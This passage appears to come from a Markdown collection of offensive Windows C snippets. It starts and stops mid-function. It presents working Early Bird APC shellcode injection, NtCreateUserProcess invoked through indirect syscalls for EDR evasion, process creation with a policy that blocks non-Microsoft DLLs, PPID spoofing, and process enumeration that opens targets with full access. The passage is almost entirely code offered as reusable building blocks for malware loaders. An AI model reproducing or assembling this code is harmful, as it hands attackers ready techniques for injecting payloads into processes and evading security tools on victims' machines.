	if (!(pRtlCreateProcessParametersEx = GetProcAddress(GetModuleHandleW(TEXT("NTDLL")), "RtlCreateProcessParametersEx"))) {
		printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!(pAttributeList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pwcDuplicateStr = _wcsdup(szProcessPath))) {
		printf("[!] Failed To Duplicate \"%ws\" - %d\n", szProcessPath, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (!(pszNtProcessPath = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ( wcslen(szProcessPath) * sizeof(WCHAR) + sizeof(L"\\??\\") ) ))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pszFullProcessParm = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ( (wcslen(szProcessPath) * sizeof(WCHAR)) + (szProcessParms ? ( wcslen(szProcessParms) * sizeof(WCHAR) ) : 0x00) )))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	wsprintfW(pszNtProcessPath, L"\\??\\%s", szProcessPath);
	// Append the process parameters to the process path (if exists)
	if (szProcessParms)
		wsprintfW(pszFullProcessParm, L"%s %s", szProcessPath, szProcessParms);
	else
		wsprintfW(pszFullProcessParm, L"%s", szProcessPath);
	RtlInitUnicodeString(&NtImagePath, pszNtProcessPath);
	RtlInitUnicodeString(&ProcCommandLine, pszFullProcessParm);
	RtlInitUnicodeString(&ProcCurrentDir, pwcDuplicateStr);


	if (!NT_SUCCESS((STATUS = pRtlCreateProcessParametersEx(&pUserProcessParams, &NtImagePath, NULL, &ProcCurrentDir, &ProcCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)))) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	pAttributeList->TotalLength				= sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE);
	pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size		= NtImagePath.Length;
	pAttributeList->Attributes[0].Value		= (ULONG_PTR)NtImagePath.Buffer;

	PsCreateInfo.Size						= sizeof(PS_CREATE_INFO);
	PsCreateInfo.State						= PsCreateInitialState;

	SET_SYSCALL(NtCreateUserProcess);
	if (!NT_SUCCESS((STATUS = RunSyscall(phProcess, phThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0x00, 0x00, pUserProcessParams, &PsCreateInfo, pAttributeList)))) {
		printf("[!] NtCreateUserProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pAttributeList)
		HeapFree(GetProcessHeap(), 0x00, pAttributeList);
	if (pszNtProcessPath)
		HeapFree(GetProcessHeap(), 0x00, pszNtProcessPath);
	if (pszFullProcessParm)
		HeapFree(GetProcessHeap(), 0x00, pszFullProcessParm);
	return bResult;
}
```
### Early Bird Process Injection (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL EarlyBirdProcessInjectionA(IN LPCSTR cProcessImgNameAndParms, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!cProcessImgNameAndParms || !pShellcodeAddress || !sShellcodeSize || !pProcessInfo)
		return FALSE;

	STARTUPINFO				StartupInfo				= { 0 };
	PVOID					pBaseAddress			= NULL;
	DWORD					dwCreationFlags			= (DEBUG_ONLY_THIS_PROCESS | DETACHED_PROCESS),
							dwOldProtection			= 0x00;
	SIZE_T					NumberOfBytesWritten	= 0x00;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFO));

	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, cProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessA Failed with Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!(pBaseAddress = VirtualAllocEx(pProcessInfo->hProcess, NULL, sShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
		printf("[!] VirtualAllocEx Failed with Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(pProcessInfo->hProcess, pBaseAddress, pShellcodeAddress, sShellcodeSize, &NumberOfBytesWritten) || sShellcodeSize != NumberOfBytesWritten) {
		printf("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("[!] Wrote %d Of %d Bytes\n", (int)NumberOfBytesWritten, (int)sShellcodeSize);
		return FALSE;
	}

	if (!VirtualProtectEx(pProcessInfo->hProcess, pBaseAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!QueueUserAPC((PAPCFUNC)pBaseAddress, pProcessInfo->hThread, NULL)) {
		printf("[!] QueueUserAPC Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!DebugActiveProcessStop(pProcessInfo->dwProcessId)) {
		printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Early Bird Process Injection (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL EarlyBirdProcessInjectionW(IN LPWSTR szProcessImgNameAndParms, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!szProcessImgNameAndParms || !pShellcodeAddress || !sShellcodeSize || !pProcessInfo)
		return FALSE;

	STARTUPINFOW			StartupInfo				= { 0 };
	PVOID					pBaseAddress			= NULL;
	DWORD					dwCreationFlags			= (DEBUG_ONLY_THIS_PROCESS | DETACHED_PROCESS),
							dwOldProtection			= 0x00;
	SIZE_T					NumberOfBytesWritten	= 0x00;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));

	StartupInfo.cb = sizeof(STARTUPINFOW);

	if (!CreateProcessW(NULL, szProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessW Failed with Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!(pBaseAddress = VirtualAllocEx(pProcessInfo->hProcess, NULL, sShellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
		printf("[!] VirtualAllocEx Failed with Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(pProcessInfo->hProcess, pBaseAddress, pShellcodeAddress, sShellcodeSize, &NumberOfBytesWritten) || sShellcodeSize != NumberOfBytesWritten) {
		printf("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("[!] Wrote %d Of %d Bytes\n", (int)NumberOfBytesWritten, (int)sShellcodeSize);
		return FALSE;
	}

	if (!VirtualProtectEx(pProcessInfo->hProcess, pBaseAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!QueueUserAPC((PAPCFUNC)pBaseAddress, pProcessInfo->hThread, NULL)) {
		printf("[!] QueueUserAPC Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!DebugActiveProcessStop(pProcessInfo->dwProcessId)) {
		printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Process Creation With Block DLL Policy Enabled (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreateProcessWithBlockDllPolicyA(IN LPSTR cProcessImgNameAndParms, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!cProcessImgNameAndParms || !pProcessInfo)
		return FALSE;

	STARTUPINFOEXA						StartupInfoEx		= { 0 };
	SIZE_T								sThreadAttListSize	= NULL;
	PPROC_THREAD_ATTRIBUTE_LIST			pThreadAttList		= NULL;
	DWORD								dwCreationFlags		= (EXTENDED_STARTUPINFO_PRESENT | DETACHED_PROCESS);
	PCHAR								pcDuplicateStr		= NULL,
										pcLastSlash			= NULL;
	DWORD64								dw64Policy			= PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&StartupInfoEx, sizeof(STARTUPINFOEXW));

	if (!(pcDuplicateStr = _strdup(cProcessImgNameAndParms))) {
		printf("[!] Failed To Duplicate \"%s\" - %d\n", cProcessImgNameAndParms, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pcLastSlash = strrchr(pcDuplicateStr, '\\'))
		*pcLastSlash = '\0';

	if (!InitializeProcThreadAttributeList(NULL, 0x01, 0x00, &sThreadAttListSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		printf("[!] InitializeProcThreadAttributeList [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttListSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!InitializeProcThreadAttributeList(pThreadAttList, 0x01, 0x00, &sThreadAttListSize)) {
		printf("[!] InitializeProcThreadAttributeList [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, 0x00, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dw64Policy, sizeof(DWORD64), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	StartupInfoEx.StartupInfo.dwFlags	= EXTENDED_STARTUPINFO_PRESENT;
	StartupInfoEx.StartupInfo.cb		= sizeof(STARTUPINFOEXA);
	StartupInfoEx.lpAttributeList		= pThreadAttList;

	if (!CreateProcessA(NULL, cProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, pcDuplicateStr, &StartupInfoEx.StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessA Failed with Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (pcDuplicateStr)
		free(pcDuplicateStr);
	if (pThreadAttList)
		DeleteProcThreadAttributeList(pThreadAttList);
	if (pThreadAttList)
		HeapFree(GetProcessHeap(), 0x00, pThreadAttList);
	return pProcessInfo->hProcess ? TRUE : FALSE;
}
```
### Process Enumeration Via Snapshot
```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

BOOL GetProcessIDViaSnapShot(IN LPWSTR szProcessName, OUT PDWORD pdwProcessID, OUT OPTIONAL PHANDLE phProcess) {

	PROCESSENTRY32  ProcEntry						= { .dwSize = sizeof(PROCESSENTRY32) };
	WCHAR			wcUpperCaseProcName[MAX_PATH]	= { 0x00 };
	HANDLE			hSnapShot						= INVALID_HANDLE_VALUE;

	if (!szProcessName || !pdwProcessID || lstrlenW(szProcessName) >= MAX_PATH)
		return FALSE;

	for (int i = 0; i < lstrlenW(szProcessName); i++){
		if (szProcessName[i] >= 'a' && szProcessName[i] <= 'z')
			wcUpperCaseProcName[i] = szProcessName[i] - 'a' + 'A';
		else
			wcUpperCaseProcName[i] = szProcessName[i];
	}

	if ((hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!Process32First(hSnapShot, &ProcEntry)) {
		printf("[!] Process32First Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	do {

		WCHAR	szUprProcName[MAX_PATH] = { 0x00 };

		if (ProcEntry.szExeFile && lstrlenW(ProcEntry.szExeFile) < MAX_PATH) {

			RtlSecureZeroMemory(szUprProcName, sizeof(szUprProcName));

			for (int i = 0; i < lstrlenW(ProcEntry.szExeFile); i++) {
				if (ProcEntry.szExeFile[i] >= 'a' && ProcEntry.szExeFile[i] <= 'z')
					szUprProcName[i] = ProcEntry.szExeFile[i] - 'a' + 'A';
				else
					szUprProcName[i] = ProcEntry.szExeFile[i];
			}

		}

		if (wcscmp(szUprProcName, wcUpperCaseProcName) == 0x00) {
			if (phProcess)
				*phProcess	= OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcEntry.th32ProcessID);

			*pdwProcessID	= ProcEntry.th32ProcessID;

			break;
		}

	} while (Process32Next(hSnapShot, &ProcEntry));


_END_OF_FUNC:
	if (hSnapShot != INVALID_HANDLE_VALUE)
		CloseHandle(hSnapShot);
	return (*pdwProcessID) ? TRUE : FALSE;
}
```
### Create Process (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreateProcessViaWinAPIsA(IN LPCSTR cProcessImgNameAndParms, IN OPTIONAL DWORD dwFlags, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!cProcessImgNameAndParms || !pProcessInfo)
		return FALSE;

	STARTUPINFO				StartupInfo			= { .cb = sizeof(STARTUPINFO) };
	DWORD					dwCreationFlags		= dwFlags | NORMAL_PRIORITY_CLASS;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));

	if (!CreateProcessA(NULL, cProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessA Failed with Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```
### Process Creation With Block non-Microsoft DLLs Policy Enabled (Unicode)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreateProcessWithBlockDllPolicyW(IN LPWSTR szProcessImgNameAndParms, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!szProcessImgNameAndParms || !pProcessInfo)
		return FALSE;

	STARTUPINFOEXW						StartupInfoEx		= { 0 };
	SIZE_T								sThreadAttListSize	= NULL;
	PPROC_THREAD_ATTRIBUTE_LIST			pThreadAttList		= NULL;
	DWORD								dwCreationFlags		= (EXTENDED_STARTUPINFO_PRESENT | DETACHED_PROCESS);
	PWCHAR								pwcDuplicateStr		= NULL,
										pwcLastSlash		= NULL;
	DWORD64								dw64Policy			= PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&StartupInfoEx, sizeof(STARTUPINFOEXW));

	if (!(pwcDuplicateStr = _wcsdup(szProcessImgNameAndParms))) {
		printf("[!] Failed To Duplicate \"%ws\" - %d\n", szProcessImgNameAndParms, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (!InitializeProcThreadAttributeList(NULL, 0x01, 0x00, &sThreadAttListSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		printf("[!] InitializeProcThreadAttributeList [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttListSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!InitializeProcThreadAttributeList(pThreadAttList, 0x01, 0x00, &sThreadAttListSize)) {
		printf("[!] InitializeProcThreadAttributeList [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, 0x00, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &dw64Policy, sizeof(DWORD64), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	StartupInfoEx.StartupInfo.dwFlags	= EXTENDED_STARTUPINFO_PRESENT;
	StartupInfoEx.StartupInfo.cb		= sizeof(STARTUPINFOEXW);
	StartupInfoEx.lpAttributeList		= pThreadAttList;

	if (!CreateProcessW(NULL, szProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, pwcDuplicateStr, &StartupInfoEx.StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessW Failed with Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (pwcDuplicateStr)
		free(pwcDuplicateStr);
	if (pThreadAttList)
		DeleteProcThreadAttributeList(pThreadAttList);
	if (pThreadAttList)
		HeapFree(GetProcessHeap(), 0x00, pThreadAttList);
	return pProcessInfo->hProcess ? TRUE : FALSE;
}
```
### Process Creation With Block DLL Policy
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"
#include "HellsHall.h"

#define NtCreateUserProcess_CRC32			0x2B09FF3F

typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
	PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
	PUNICODE_STRING					ImagePathName,
	PUNICODE_STRING					DllPath,
	PUNICODE_STRING					CurrentDirectory,
	PUNICODE_STRING					CommandLine,
	PVOID							Environment,
	PUNICODE_STRING					WindowTitle,
	PUNICODE_STRING					DesktopInfo,
	PUNICODE_STRING					ShellInfo,
	PUNICODE_STRING					RuntimeData,
	ULONG							Flags
);

// -------------------------------- //// -------------------------------- //// -------------------------------- //

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL BlockDllPolicyViaNtCreateUserProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szProcessParms, OUT PHANDLE phProcess, OUT PHANDLE phThread) {

	if (!szProcessPath || !szProcessParms || !phProcess || !phThread)
		return FALSE;

	BOOL							bResult							= FALSE;
	fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx	= NULL;
	NTSTATUS						STATUS							= 0x00;
	PPS_ATTRIBUTE_LIST				pAttributeList					= NULL;
	PRTL_USER_PROCESS_PARAMETERS	pUserProcessParams				= NULL;
	PWCHAR							pwcDuplicateStr					= NULL,
									pwcLastSlash					= NULL,
									pszNtProcessPath				= NULL,
									pszFullProcessParm				= NULL;
	UNICODE_STRING					NtImagePath						= { 0 },
									ProcCommandLine					= { 0 },
									ProcCurrentDir					= { 0 };
	PS_CREATE_INFO					PsCreateInfo					= { 0 };
	NT_SYSCALL						NtCreateUserProcess				= { 0 };
	DWORD64                         dw64BlockDllPolicy				= PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	if (!FetchNtSyscall(NtCreateUserProcess_CRC32, &NtCreateUserProcess)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateUserProcess \n");
		return FALSE;
	}

	if (!(pRtlCreateProcessParametersEx = GetProcAddress(GetModuleHandleW(TEXT("NTDLL")), "RtlCreateProcessParametersEx"))) {
		printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!(pAttributeList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(PS_ATTRIBUTE_LIST) + 2 * sizeof(PS_ATTRIBUTE))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pwcDuplicateStr = _wcsdup(szProcessPath))) {
		printf("[!] Failed To Duplicate \"%ws\" - %d\n", szProcessPath, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (!(pszNtProcessPath = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (wcslen(szProcessPath) * sizeof(WCHAR) + sizeof(L"\\??\\"))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pszFullProcessParm = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ((wcslen(szProcessPath) * sizeof(WCHAR)) + (szProcessParms ? (wcslen(szProcessParms) * sizeof(WCHAR)) : 0x00))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	wsprintfW(pszNtProcessPath, L"\\??\\%s", szProcessPath);
	// Append the process parameters to the process path (if exists)
	if (szProcessParms)
		wsprintfW(pszFullProcessParm, L"%s %s", szProcessPath, szProcessParms);
	else
		wsprintfW(pszFullProcessParm, L"%s", szProcessPath);
	RtlInitUnicodeString(&NtImagePath, pszNtProcessPath);
	RtlInitUnicodeString(&ProcCommandLine, pszFullProcessParm);
	RtlInitUnicodeString(&ProcCurrentDir, pwcDuplicateStr);

	if (!NT_SUCCESS((STATUS = pRtlCreateProcessParametersEx(&pUserProcessParams, &NtImagePath, NULL, &ProcCurrentDir, &ProcCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)))) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	pAttributeList->TotalLength					= sizeof(PS_ATTRIBUTE_LIST) + 2 * sizeof(PS_ATTRIBUTE);
	pAttributeList->Attributes[0].Attribute		= PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size			= NtImagePath.Length;
	pAttributeList->Attributes[0].Value			= (ULONG_PTR)NtImagePath.Buffer;

	pAttributeList->Attributes[1].Attribute		= PS_ATTRIBUTE_MITIGATION_OPTIONS;
	pAttributeList->Attributes[1].Size			= sizeof(DWORD64);
	pAttributeList->Attributes[1].Value			= &dw64BlockDllPolicy;

	PsCreateInfo.Size							= sizeof(PS_CREATE_INFO);
	PsCreateInfo.State							= PsCreateInitialState;

	SET_SYSCALL(NtCreateUserProcess);
	if (!NT_SUCCESS((STATUS = RunSyscall(phProcess, phThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0x00, 0x00, pUserProcessParams, &PsCreateInfo, pAttributeList)))) {
		printf("[!] NtCreateUserProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pAttributeList)
		HeapFree(GetProcessHeap(), 0x00, pAttributeList);
	if (pszNtProcessPath)
		HeapFree(GetProcessHeap(), 0x00, pszNtProcessPath);
	if (pszFullProcessParm)
		HeapFree(GetProcessHeap(), 0x00, pszFullProcessParm);
	return bResult;
}
```
### Process Enumeration Via NtQuerySystemInformation
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

BOOL GetProcessIDViaNtQueryFunc(IN LPWSTR szProcessName, OUT PDWORD pdwProcessID, OUT OPTIONAL PHANDLE phProcess) {

	NTSTATUS						STATUS							= 0x00;
	fnNtQuerySystemInformation		pNtQuerySystemInformation		= NULL;
	WCHAR							wcUpperCaseProcName[MAX_PATH]	= { 0x00 };
	ULONG							uArrayLength					= 0x00;
	PSYSTEM_PROCESS_INFORMATION		pSystemProcInfo					= NULL;
	PBYTE							pTmpPntrVar						= NULL;

	if (!szProcessName || !pdwProcessID || lstrlenW(szProcessName) >= MAX_PATH)
		return FALSE;

	for (int i = 0; i < lstrlenW(szProcessName); i++) {
		if (szProcessName[i] >= 'a' && szProcessName[i] <= 'z')
			wcUpperCaseProcName[i] = szProcessName[i] - 'a' + 'A';
		else
			wcUpperCaseProcName[i] = szProcessName[i];
	}

	if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uArrayLength)) != STATUS_SUCCESS && STATUS != STATUS_INFO_LENGTH_MISMATCH) {
		printf("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!(pTmpPntrVar = pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uArrayLength))) {
		printf("[!] HeapAlloc Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = pNtQuerySystemInformation(SystemProcessInformation, pSystemProcInfo, uArrayLength, NULL)))) {
		printf("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	while (pSystemProcInfo->NextEntryOffset) {

		WCHAR	szUprProcName[MAX_PATH] = { 0x00 };

		if (!pSystemProcInfo->ImageName.Length || pSystemProcInfo->ImageName.Length >= MAX_PATH)
			goto _NEXT_ELEMENT;

		for (int i = 0; i < pSystemProcInfo->ImageName.Length; i++) {
			if (pSystemProcInfo->ImageName.Buffer[i] >= 'a' && pSystemProcInfo->ImageName.Buffer[i] <= 'z')
				szUprProcName[i] = pSystemProcInfo->ImageName.Buffer[i] - 'a' + 'A';
			else
				szUprProcName[i] = pSystemProcInfo->ImageName.Buffer[i];
		}

		if (wcscmp(wcUpperCaseProcName, szUprProcName) == 0x00) {
			if (phProcess)
				*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pSystemProcInfo->UniqueProcessId);

			*pdwProcessID = (DWORD)pSystemProcInfo->UniqueProcessId;

			break;
		}

_NEXT_ELEMENT:
		pSystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pSystemProcInfo + pSystemProcInfo->NextEntryOffset);
	}

_END_OF_FUNC:
	if (pTmpPntrVar)
		HeapFree(GetProcessHeap(), 0x00, pTmpPntrVar);
	return (*pdwProcessID) ? TRUE : FALSE;
}
```
### PPID Spoofing (ASCII)
```c
#include <windows.h>
#include <stdio.h>
BOOL CreatePPIDSpoofedProcessA(IN HANDLE hParentProcess, IN LPSTR cProcessImgNameAndParms, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!hParentProcess || !cProcessImgNameAndParms || !pProcessInfo)
		return FALSE;

	STARTUPINFOEXA						StartupInfoEx			= { 0 };
	SIZE_T								sThreadAttListSize		= NULL;
	PPROC_THREAD_ATTRIBUTE_LIST			pThreadAttList			= NULL;
	DWORD								dwCreationFlags			= (EXTENDED_STARTUPINFO_PRESENT | DETACHED_PROCESS);
	PCHAR								pcDuplicateStr			= NULL,
										pcLastSlash				= NULL;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&StartupInfoEx, sizeof(STARTUPINFOEXA));

	if (!(pcDuplicateStr = _strdup(cProcessImgNameAndParms))) {
		printf("[!] Failed To Duplicate \"%s\" - %d\n", cProcessImgNameAndParms, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pcLastSlash = strrchr(pcDuplicateStr, '\\'))
		*pcLastSlash = '\0';

	if (!InitializeProcThreadAttributeList(NULL, 0x01, 0x00, &sThreadAttListSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
		printf("[!] InitializeProcThreadAttributeList [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttListSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!InitializeProcThreadAttributeList(pThreadAttList, 0x01, 0x00, &sThreadAttListSize)) {
		printf("[!] InitializeProcThreadAttributeList [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, 0x00, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

